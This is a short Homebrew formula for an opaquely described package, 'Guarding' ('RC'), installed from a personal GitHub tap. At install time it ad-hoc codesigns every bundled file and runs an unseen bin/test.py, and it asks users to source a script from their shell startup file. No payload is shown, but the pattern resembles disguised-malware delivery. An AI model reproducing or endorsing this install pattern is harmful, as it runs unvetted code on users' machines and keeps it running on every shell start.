class Guarding < Formula
    desc "RC"
    homepage "https://github.com/cirillo/"
    url "https://github.com/cirillo/homebrew-apple/raw/refs/heads/main/guarding-1.0.2.tar.gz"
            
    sha256 "6aaba9a7f3126610bef0bffcb9352d32f5cc152987ee2133511a91ba707f1b61"
    version "1.0.2"
    
    depends_on "python@3.13" => [:build, :test]

    def python3
        which("python3.13")
    end

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
    
        system python3, "-m", "venv", "--system-site-packages", "--without-pip", "#{libexec}"
        system "#{libexec}/bin/python", "#{bin}/test.py"
        #system "#{libexec}/bin/python", "#{bin}/py.py"
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
